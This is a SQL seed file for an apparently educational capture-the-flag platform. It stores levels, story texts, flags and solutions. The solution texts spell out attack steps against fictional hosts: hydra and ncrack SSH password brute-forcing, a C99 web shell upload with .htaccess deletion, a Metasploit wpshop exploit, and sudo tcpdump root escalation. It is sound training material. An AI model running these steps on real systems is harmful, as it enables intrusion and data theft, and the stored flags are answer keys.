INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 1');
INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 2');
INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 3');
INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 4');
INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 5');
INSERT INTO snapshot_hook(id, snapshot) VALUES (nextval('snapshot_hook_id_seq'), 'Snapshot 6');

INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));
INSERT INTO beta_testing_group(id) VALUES (nextval('beta_testing_group_id_seq'));

INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 20, 7, 'Game Level1', 1);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 55, 8, 'Game Level2', 4);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 70, null, 'Game Level Test', 2);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 70, 1, 'Info Level1', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 13, 2, 'Info Level2', 5);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 3, 'Info Level Test', 3);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 50, null, 'Assessment Level1', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 75, null, 'Assessment Level2', 6);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 100, null, 'Assessment Level Test', null);

INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 11, 'Network Error - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 20, 12, 'Network Error', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 13, 'New Secure Connection - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 20, 14, 'New Secure Connection', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 15, 'Unavailable Document - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 35, 16, 'Unavailable Document', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 17, 'Disable Passwords - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 25, null, 'Disable Passwords', null);

INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 19, 'Finding the Vulnerability - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 3, 20, 'Finding the Vulnerability', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 21, 'This Will Not Keep You Out - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 5, 22, 'This Will Not Keep You Out', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 23, 'Gaining the Document - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 3, null, 'Gaining the Document', null);

INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 25, 'Gaining Access - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 20, 26, 'Gaining Access', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 27, 'There Must be Some Vulnerability - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 25, 28, 'There Must be Some Vulnerability', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 29, 'Hack This Site - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 25, 30, 'Hack This Site', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 31, 'Make Me Root - Info', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 30, null, 'Make Me Root', null);

INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 10, 'Base info for No Secure Connection', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 18, 'Base info for Rigging the Election', null);
INSERT INTO abstract_level(id, max_score, next_level, title, snapshot_hook_id) VALUES (nextval('abstract_level_id_seq'), 0, 24, 'Base info for The Biggest Stock Scam Of All Time', null);


INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (1, null, 25, 5, 'Play me', 'secretFlag', 'This is how you do it', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (2, null, 60, 3, 'Unsolvable problem', 'jibberish', 'Not sure yet', false);
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (3, null, 25, 5, 'Play me', 'secretFlag', 'correct flag', true);

INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (11, null, 5, 5, '<style type="text/css">
  .prompt {color: #B7B7B7; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Just read it!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Right-click on any TELNET packet and select option <b>"Follow → TCP stream"</b>.</li>
  <li>Read the conversation and search for "FLAG".</li>
</ol>', 'NoMoreTelnet', 'NoMoreTelnet', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (13, null, 5, 5, '<style type="text/css">
  .prompt {color: #B7B7B7; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Follow the tool!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Connect to the server:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">ssh bnovak@database.bigbroker.ex</span></pre>
  <li>Start the passcheck.py tool:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@database:~$ </span><span class="command">./Tools/passcheck.py</span></pre>
  <li>Follow instructions...</li>
</ol>
', 'SetAndSafe', 'SetAndSafe', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (15, null, 15, 5, '<style type="text/css">
  .prompt {color: #B7B7B7; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Just open the link!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Usage of the tool is described at <a href="https://tools.kali.org/password-attacks/hydra" target="_blank">https://tools.kali.org/password-attacks/hydra</a>:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">hydra -l vondrus -P ~/Downloads/500-worst-passwords.txt ssh://database.bigbroker.ex</span></pre>
  <li>After you retrieve credentials, connect to the central server as Vladimir and read the document.</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">ssh vondrus@database.bigbroker.ex</span>
<span class="prompt">vondrus@database:~$ </span><span class="command">cat ~/Documents/company_employees.xml</span></pre>
</ol>', 'WhatAHacker', 'WhatAHacker', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (17, null, 5, 5, '<style type="text/css">
  .prompt {color: #B7B7B7; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Follow the guide!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Create the SSH key pair:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">ssh-keygen -t rsa</span></pre>
  <li>Follow the instructions. (Do not change the file path and set a secure passphrase.)</li>
  <li>Upload the new key to the central server:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">ssh-copy-id bnovak@database.bigbroker.ex</span></pre>
  <li>Log in to the server and get content of the authorized_keys file:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">bnovak@workstation:~$ </span><span class="command">ssh bnovak@database.bigbroker.ex</span>
<span class="prompt">bnovak@database:~$ </span><span class="command">cat ~/.ssh/authorized_keys</span></pre>
</ol>', 'SSHKeys', 'SSHKeys', true );

INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (19, null, 8, 5, '<p>
  <b>Come on, this is really easy!</b>
</p>

<ol>
  <li>Register yourself on the website.</li>
  <li>On the left side, click on Documents and click on "Browse". Select the Web Shell script located in "/root/c99.php". Then click on upload.</li>
  <li>The hash will appear in green box. Use it''s first 5 characters as the flag.</li>
</ol>', '61a92', '61a92', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (21, null, 15, 5, '<p>
  <b>it is little tricky!</b>
</p>

<ol>
  <li>Open the page with file upload. You should already have Web Shell uploaded there.</li>
  <li>Right click delete button and then click "Inspect element".</li>
  <li>One line above the "active" line there should be line with parameter NAME="path" and value="XXXX". Change the value parameter to "documents/.htaccess" and press delete button back on website itself.</li>
  <li>Click the C99.php Web Shell. You should be able to run it and see the flag.</li>
</ol>', '0x6a8', '0x6a8', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (23, null, 5, 5, '<p>
  <b>Now its is easy!</b>
</p>

<ol>
  <li>In documents, click on file c99.php. It should open the Web Shell.</li>
  <li>In the Web Shell, you can see file structure of the server. Use ".." to go one folder up until you arrive on the very highest level.</li>
  <li>Click on home and then on msramek. You should see FranksPanamasStocks file.</li>
  <li>Click on "text" icon to open file as text. (It is next to icon that looks like Internet Explorer icon).</li>
</ol>', '8342538', '8342538', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (25, null, 15, 5, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Come on, you know how to do this!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Scan the workstation and get open ports and publicly available services:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">root@attacker:~# </span><span class="command">nmap 172.18.1.132</span></pre>

  <li>Start a dictionary attack on SSH using hydra or ncrack tool and get login credentials:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">root@attacker:~# </span><span class="command">hydra -V -L /root/usernames.txt -P /root/passwords.txt 172.18.1.132 ssh</span>
<span class="prompt">root@attacker:~# </span><span class="command">ncrack -v -U /root/usernames.txt -P /root/passwords.txt 172.18.1.132:22</span></pre>
</ol>', 'starwars', 'starwars', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (27, null, 15, 5, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>This is the funny part!</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Copy your Tools to the workstation:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">root@attacker:~# </span><span class="command">scp -r /root/Tools vondrus@172.18.1.132:/tmp/</span></pre>

  <li>Unzip the wpscan archive:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt">root@attacker:~# </span><span class="command">ssh -YC vondrus@172.18.1.132</span>
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd /tmp/Tools/</span>
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">unzip wpscan.zip</span></pre>

  <li>Run vulnerability scanning:</li>
    <pre style="background-color:black; margin-top: 1em"><span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd ./wpscan</span>
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">./wpscan --url http://bigbroker.ex --enumerate vp</span></pre>
</ol>', '7830', '7830', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (29, null, 15, 5, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>Hacking is coming...</b>
</p>

<ol style="margin-bottom: 2em">
  <li>Unzip the metasploit archive you copied to the workstation:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd /tmp/Tools/</span>
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">unzip metasploit.zip</span>
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">cd ./metasploit</span></pre>

  <li>Run the metasploit and start the exploit process:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">./msfconsole</span>
<span class="prompt" style="color: white;">&gt; </span><span class="command">use exploit/unix/webapp/wp_wpshop_ecommerce_file_upload</span>
<span class="prompt" style="color: white;">&gt; </span><span class="command">set RHOST bigbroker.ex</span>
<span class="prompt" style="color: white;">&gt; </span><span class="command">exploit</span></pre>

  <li>Get the current username:</li>
    <pre style="background-color:black; margin-top: 1em">
<span class="prompt" style="color: white;">&gt; </span><span class="command">shell</span>
<span class="command">whoami</span></pre>
</ol>', 'www-data', 'www-data', true );
INSERT INTO game_level(id, attachments, estimated_duration, incorrect_flag_limit, content, flag, solution, solution_penalized) VALUES (31, null, 15, 5, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  <b>This is true magic!</b> If you want to know more about ways of privilege escalation, see <a href="https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md" target="_blank"><b>https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md</b></a>.
</p>

<ol style="margin-bottom: 2em">
  <li>The file with clients of Big Broker Inc. connected to the fraud is available at the "/home/bigbroker/" directory:
    <pre style="background-color:black; margin-top: 1em">
<span class="command">ls /home/bigbroker/</span></pre>

  <li>The server is up to date so that no exploit can be used. But the administrator allows you to run "tcpdump" program with the sudo as you can see using the following command:
<pre style="background-color:black; margin-top: 1em">
<span class="command">sudo -l</span></pre>

  <li>The program can be used to run a script. Therefore, you can perform command as a "root" as follows:
    <pre style="background-color:black; margin-top: 1em">
<span class="command">echo $'' id\ncat /home/bigbroker/pear-clients.xml'' > /tmp/.exploit</span>
<span class="command">chmod +x /tmp/.exploit</span>
<span class="command">sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/.exploit -Z root</span></pre>
</ol>', 'YouAreAHacker', 'YouAreAHacker', true );


INSERT INTO info_level(id, content) VALUES (4, 'Informational stuff');
INSERT INTO info_level(id, content) VALUES (5, 'Potatoes are not poisonous');
INSERT INTO info_level(id, content) VALUES (6, 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean vel tellus id orci interdum pulvinar et eu nisi. Suspendisse consequat, metus vel tempus placerat, eros nulla gravida enim, at suscipit nunc ex sit amet purus. Morbi scelerisque felis eget scelerisque ultricies. Aenean maximus, eros ac convallis tempus, ipsum ipsum venenatis magna, ac ullamcorper odio felis id augue. Donec tempus quis mauris quis sollicitudin. Donec et lorem porttitor, vulputate neque ut, sodales arcu. Phasellus iaculis dolor vel tincidunt vestibulum. Etiam dui neque, congue id aliquet et, blandit at diam. Ut purus orci, dapibus semper lobortis in, placerat id augue. Nam varius, ex sit amet viverra molestie, metus nibh ornare diam, in volutpat risus ligula eget ipsum. ');

INSERT INTO info_level(id, content) VALUES (10, '<style type="text/css">
  .prompt {color: #B7B7B7; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  Damn computer error! <b>Network connection is slow</b>, and you are not able to sell stocks in time. Your network administrator <b>pretends that everything is fine</b> and advises you to turn your computer off and on again. Of course, that does not help and you must try to <b>fix it yourself</b>. Fortunately, you have a friend who is more familiar with information technology than you. So you call him immediately. After a while of thinking, he advises you to install the <i style="color: #008000">Wireshark</i> utility, run the packet capture, and send the result to him, just to make sure the network is working properly. Wireshark shows a lot of <b>TELNET</b> connections, but what is the biggest surprise? It contains <b>internal information</b> which should be accessible only to selected people...
</p>

<p>
  To start the packet capture, login to the Workstation (<b>username: <span style="color: #008000">bnovak</span></b>, <b>password: <span style="color: #008000">rabbit</span></b>), double-click on the Wireshark icon on the Desktop and run capture by clicking on the <b>"any"</b> network. Now you have access to <b>the content of internal reports</b> and even  <b>connection passwords!</b> Maybe it would be worthwhile to use some of the data for your profit before you report it to the administrator.
</p>

<p>
  Look at the packet capture and explore the internal reports. <b>The level flag is mentioned in the communication.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/ctf-1-wireshark.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em; width: 40%;">

<p style="margin-top: 2em">
  <b>If you are stuck and need help, use the following hint:</b>
  <ul>
    <li>How to make the packet capture in the Wireshark more readable.</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (12, '<p>
  Thanks to your notice and threatening e-mail from your boss, network administrator forbids usage of the <b>insecure Telnet protocol</b> for connection to the company''s central server (<b>database.bigbroker.ex</b>). No one can read the sensitive internal reports anymore. From nowon, the <b>SSH protocol</b> will be used instead. This protocol provides an <b>encrypted connection</b> hiding all the transferred content. Everything will be allright now!
</p>

<p>
  The administrator has created <b>new server accounts with simple passwords</b> for all employees. Afterward, he sent an individual e-mail to each of them containing connection instruction together with a request on <b>immediate password change</b>. You received the e-mail as well:
</p>

<pre style="background: white; word-break: keep-all; width: 70%; margin-left: auto; margin-right: auto;">
From: administrator@bigbroker.ex
To: BohumirNovak@bigbroker.ex

Dear colleague,

our central server is much safer now! You can connect securely to the server using the "ssh" command (see a guide at https://www.ssh.com/ssh/command/). However, the upgrade brings small complications for you. I had to create new accounts for all users and set up new access passwords (see your password below). The provided password is usable only for the first login. Please change it immediately! For the sake of simplicity, I''ve created a simple tool to help you create and set up a new secure password. You can run the tool using the following command: "~/Tools/passcheck.py". I believe the server and all your connections will be secure now.

SSH username: bnovak
SSH password: scorpion

If you have any problem, do not hesitate to contact me.

Best regards,
  Milos Talas
</pre>

<p>
  That''s great news! Thanks to your efforts, internal information about stock trading are sufficiently secured. The last thing left is to connect to the central server and <b>change your password</b>. (Do not forget to remember your new password!) <span style="color: #008000">Use the tool provided by the administrator and change your password to a much secure one.</span>
</p>

<p>
  <b>The level flag is provided by the tool after the successful password change.</b>
</p>

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hint:</b>
  <ul>
    <li>How to connect to the server via SSH</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (14, '<p>
  Thanks to the repeated request for help, the administrator finally <b>fixed your computer</b> and you can trade stocks as you are used to. Right on time! One of your <b>biggest tradings is waiting for you</b>. Your colleague <b>Vladimir Ondrus</b> has been fired and all his work for Pear Inc., one of the most important corporate partners, was assigned to you! All trading is kept as secret as possible, but you need to know who is involved. <span style="color: #008000"> And of course, you can''t ask every single colleague.</span>
</p>

<p>
  Based on your previous cooperation, you know Vladimir has a <b>backup of all involved employees</b> in his Documents at the central server (<b>./Documents/company_employees.xml</b>). However, you do not have the <b>permissions to access the document</b>. Vladimir does not answers the phone, and the administrator is on vacation. Why now?! The trade time is approaching, and you really need the list. So you decide to try and <b>call your friend</b> again. Last time you were quite successful...
</p>

<img src="https://is.muni.cz/www/cermmik/ctf-1-hydra.jpg" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em;">

<p>
  Your friend recommends using a tool called <a href="https://tools.kali.org/password-attacks/hydra" target="_blank"><b>THC-Hydra</b></a> suitable for <b>cracking passwords of SSH</b> remote connection. You know that Vladimir doesn''t care too much about the security. Perhaps he was using a <b>weak password</b>! You immediately instal recommended tool on your <b>Workstation</b> and download the very first passwords dictionary you bump into (located in your <b>Downloads</b> directory). Now you just need to run the tool, retrieve the password and obtain the list of involved employees. <b>The level flag is at the top of the list.</b>
</p>

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hint:</b>
  <ul>
    <li>What is Vladimir''s username.</li>
    <li>How to set up the THC-Hydra if attack runs too slowly.</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (16, '<p>
  Thanks to your good friend, you were able to trade the stocks at the right time and <b>make a lot of money</b> for the Pear Inc. company. This will definitely be reflected in your salary! However, when the administrator returned from the vacation, the following <b>e-mail appeared in the mailbox</b> of all employees. <span style="color: #008000">You know very well that it''s related to your recent hacking activity...</span>
</p>

<pre style="background: white; word-break: keep-all; width: 70%; margin-left: auto; margin-right: auto;">
From: administrator@bigbroker.ex
To: internal@bigbroker.ex

Dear colleagues,

when I came back from my vacation, I discovered that someone was attacking our central server and tried to access sensitive data. Based on this experience, I have decided to increase the security level of authentication. From now on, we will use authentication based on SSH keys. Please follow the guide at the following link and set your SSH keys: https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2

After two weeks, I will disable password authentication. If you don''t upload your SSH key to the server, you will no longer be able to log in. Please check that your key was successfully uploaded and inserted into the ~/.ssh/authorized_keys file.

If you have any problems, do not hesitate to contact me.

Best regards,
  Milos Talas
</pre>

<p>
  It seems that nobody knows that you are the attacker. Lucky you! However, now you must <b>create SSH keys</b> and upload them to the server using the <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2" target="_blank"><b>referenced guide</b></a>. Try to log into the server after <b>successful key upload</b>. You will see that <i>ssh</i> tool will behave a little different. <b>The level flag is at the beginning of the ~/.ssh/authorized_keys file.</b>
</p>

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hint:</b>
  <ul>
    <li>On which computer you need to generate SSH keys</li>
  </ul>
</p>');

INSERT INTO info_level(id, content) VALUES (18, '<p>
  At first look, the website of BigBroker (http://bigbroker.ex) does not contain any input that can be exploited. <b>But what about the authenticated part?</b> Closed parts of websites often contain hidden vulnerabilities that are not fixed. It is also often that you can <b>upload some malicious files</b>. In your system is a <a href="https://attack.mitre.org/wiki/Technique/T1100" target="_blank"><b>Web Shell</b></a> script that is an <span style="color: #008000">excellent tool to upload and gain an access to the website</span>.
</p>

<p>
  If you manage to upload the Web Shell to the website, the server will tell you its hash. <b>Use the first 5 characters of the hash as a flag.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/bigbroker-login.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> How to get an access to the authenticated part of the website</li>
    <li><b>Hint 2:</b> Where is the Web Shell script located</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (20, '<p>
  Unfortunately, although you have been able to upload the Web Shell, you are <b>unable to run it</b>. It seems the creator of this site knew what he was doing, so you cannot execute that PHP code. However, you know that there is some <a href="https://httpd.apache.org/docs/current/configuring.html" target="_blank"><b>configuration file</b></a> located on the web server that is used to forbid things like that. <span style="color: #008000">Try to find out which file it is and somehow make the server run your PHP code.</span>
</p>

<p>
  If you are successful, you will be able to get to Web Shell. Right after accessing the Web Shell, you will see the directory with name FLAG-XXXXX. <b>Use XXXXX as the flag.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/bigbroker-no-run.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> What configuration file to look for</li>
    <li><b>Hint 2:</b> Where to look for possibility to delete the configuration file</li>
    <li><b>Hint 3:</b> How to delete the configuration file</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (22, '<p>
  Now you have access to the target server! The C99 Web Shell is a very powerful tool. Use it and try to find what you are looking for – <b>a file with the evidence of tax evasion</b>.  In the BigBroker  Inc. company is one person that is responsible for Panamas Stocks. <span style="color: #008000">Try to find out if he has something interesting stored on the server.</span>
</p>

<p>
  The flag is <b>an amount of dollars that Frank owns</b> in form of stocks in Panama (number without spaces).
</p>

<img src="https://is.muni.cz/www/cermmik/bigbroker-shell.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 3em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> Name of the person responsible for the Panamas Stocks</li>
  </ul>
</p>');

INSERT INTO info_level(id, content) VALUES (24, '<p>
  You know that the <b>internal web server</b> of Big Broker Inc. with IP address <b>172.18.1.5 (bigbroker.ex)</b> contains information about clients linked to the fraud. However, this server is accessible only from the internal network where you have no access. But, the <b>workstation at 172.18.1.132</b> address seems accessible, and you know what it means! ;) <span style="color: #008000">Try to find out how to exploit security ignorance of your former colleagues and gain access to the internal network.</span>
</p>

<p>
  If you are successful, you will be able to log in to the workstation. <b>The flag is the password you found.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/kali.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 2em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> What tool to use to detect open services on the workstation</li>
    <li><b>Hint 2:</b> What tools to use to attack the open service</li>
    <li><b>Hint 3:</b> Where are located files required by attacking tools</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (26, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
  Great, you <b>gained access to the workstation</b>, and now you can reach the web server. You know that there is an old web page with news for Big Broker''s employees. To see the web page, you can easily connect to the workstation and <b>run its web browser</b> using the following commands:
  <ul>
    <li>Connect to the workstation using SSH and obtained credentials – <b>user: <span style="color: #008000">vondrus<span></b>, <b>password: <span style="color: #008000">starwars</span></b>. (SSH options "-YC" allows you to see the graphical output.)
      <pre style="background-color:black; margin-top: 1em">
<span class="prompt">root@attacker:~# </span><span class="command">ssh -YC vondrus@172.18.1.132</span></pre>
    <li>Now you can see the internal web page using the Firefox.</li>
      <pre style="background-color:black; margin-top: 1em">
<span class="prompt" style="color: #55FF55;">vondrus@workstation:~$ </span><span class="command">firefox</span></pre>
  </ul>
</p>

<p>
  The internal web page <b>looks exactly the way you remember it</b>, no change in appearance, and the content is similar. <span style="color: #008000">There must be some way of exploiting the page to obtain access!</span> The <b>Kali Linux</b> contains a lot of interesting <b>Tools</b>. Use them to find out what vulnerability to exploit. <b>The flag is the number of the vulnerability allowing you to upload an arbitrary file</b> (...db.com/vulnerabilities/<b>XXXX</b>).
</p>

<img src="https://is.muni.cz/www/cermmik/ctf-3-bigbroker-page.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em; width: 40%;">

<p style="margin-top: 2em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> How to run your tools to reach the internal server</li>
    <li><b>Hint 2:</b> Which tool use to find the vulnerability</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (28, '<p>
  Your assumption was confirmed, the <b>server is vulnerable</b> indeed! Now, you need to find a way how to exploit the <b>old version of the wpshop plugin</b> and obtain access to the server. That should not be a big deal for you. <span style="color: #008000">Your Kali Linux contains everything you need, just use it!</span>
</p>

<p>
  If you are successful, you will be able to run commands on the server. <b>The flag is the username you will be logged in.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/wpscan-result.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 1em; width: 40%;">

<p style="margin-top: 2em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> What tool to use to exploit the vulnerability</li>
    <li><b>Hint 2:</b> What tool plugin to use</li>
  </ul>
</p>');
INSERT INTO info_level(id, content) VALUES (30, '<style type="text/css">
  .prompt {color: #FF5555; font-weight: bold;}
  .command {color:white;}
</style>

<p>
